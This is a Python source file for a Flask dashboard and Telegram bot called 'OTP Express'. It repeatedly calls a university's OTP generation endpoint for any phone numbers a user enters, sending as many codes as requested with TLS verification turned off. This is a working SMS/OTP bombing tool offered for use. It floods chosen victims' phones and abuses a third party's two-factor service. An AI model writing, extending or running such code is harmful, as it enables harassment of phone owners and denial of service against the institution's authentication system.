import os
import time
import threading
import requests
import telebot
from flask import Flask, render_template, request
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================== FLASK APP =====================
app = Flask(__name__)

OTP_GEN_URL = "https://twofa.srmu.ac.in/otp/generate"
otp_tracker = {}

# ===================== TELEGRAM BOT =====================
API_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not API_TOKEN:
    raise RuntimeError("❌ TELEGRAM_BOT_TOKEN not set")

bot = telebot.TeleBot(API_TOKEN)

# ===================== CORE OTP FUNCTION =====================
def send_otps(numbers, otp_count):
    session = requests.Session()
    session.verify = False
    batch_results = []

    for phone in numbers:
        sent = 0
        otp_tracker.setdefault(phone, 0)

        for _ in range(otp_count):
            try:
                session.post(f"{OTP_GEN_URL}/{phone}/123", timeout=10)
                sent += 1
                otp_tracker[phone] += 1
                time.sleep(1)

            except Exception as e:
                batch_results.append({
                    "phone": phone,
                    "status": f"Error: {str(e)}",
                    "sent_now": sent,
                    "total_sent": otp_tracker[phone]
                })
                break
        else:
            batch_results.append({
                "phone": phone,
                "status": "OTP sent",
                "sent_now": sent,
                "total_sent": otp_tracker[phone]
            })

    return batch_results


# ===================== BACKGROUND JOB =====================
def process_otp_job(chat_id, numbers, otp_count):
    results = send_otps(numbers, otp_count)

    response = ["✅ OTP Result:"]
    for r in results:
        response.append(
            f"📱 {r['phone']} → {r['status']} | Sent: {r['sent_now']} | Total: {r['total_sent']}"
        )

    bot.send_message(chat_id, "\n".join(response))


# ===================== TELEGRAM COMMANDS =====================
@bot.message_handler(commands=["start", "help"])
def welcome(message):
    bot.reply_to(
        message,
        "✅ *OTP Express is running!*\n\n"
        "Commands:\n"
        "/send <phone1,phone2> <count>\n"
        "/status - OTP stats\n"
        "/ping - Health check\n\n"
        "Example:\n"
        "`/send 9876543210,1234567890 5`",
        parse_mode="Markdown"
    )


@bot.message_handler(commands=["send"])
def handle_send(message):
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "❌ Usage: /send <phone1,phone2> <count>")
            return

        numbers = [
            n.strip() for n in args[1].split(",")
            if n.strip().isdigit()
        ]

        otp_count = int(args[2])
        if otp_count <= 0:
            raise ValueError

        if not numbers:
            bot.reply_to(message, "❌ Invalid phone numbers")
            return

        bot.reply_to(message, "🚀 OTP request received. Processing...")

        threading.Thread(
            target=process_otp_job,
            args=(message.chat.id, numbers, otp_count),
            daemon=True
        ).start()

    except Exception:
        bot.reply_to(message, "❌ Usage: /send <phone1,phone2> <count>")


@bot.message_handler(commands=["status"])
def status(message):
    if not otp_tracker:
        bot.reply_to(message, "ℹ️ No OTP activity yet.")
        return

    msg = "📊 OTP Tracker:\n"
    for phone, total in otp_tracker.items():
        msg += f"📱 {phone}: {total}\n"

    bot.reply_to(message, msg)


@bot.message_handler(commands=["ping"])
def ping(message):
    bot.reply_to(message, "pong ✅")


# ===================== TELEGRAM WEBHOOK =====================
@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    update = telebot.types.Update.de_json(
        request.get_data().decode("utf-8")
    )
    bot.process_new_updates([update])
    return "OK", 200


# ===================== WEB DASHBOARD =====================
@app.route("/", methods=["GET", "POST"])
def index():
    results = []
    error = None

    if request.method == "POST":
        numbers_raw = request.form.get("numbers", "")
        otp_count = request.form.get("otp_count", "1")

        try:
            otp_count = int(otp_count)
            if otp_count <= 0:
                raise ValueError
        except ValueError:
            error = "OTP count must be positive"
            return render_template("index.html", error=error)

        numbers = [
            n.strip() for n in numbers_raw.replace("\n", ",").split(",")
            if n.strip().isdigit()
        ]

        if not numbers:
            error = "Enter valid numbers"
        else:
            results = send_otps(numbers, otp_count)

    return render_template(
        "index.html",
        results=results,
        tracker=otp_tracker,
        error=error
    )


# ===================== INIT BOT =====================
def init_bot():
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
    if not WEBHOOK_URL:
        print("❌ WEBHOOK_URL not set")
        return

    full_url = f"{WEBHOOK_URL}/telegram-webhook"
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=full_url)

    print("✅ Webhook set:", full_url)

    owner = os.environ.get("OWNER_CHAT_ID")
    if owner:
        try:
            bot.send_message(owner, "✅ Bot deployed successfully 🚀")
        except:
            pass


init_bot()
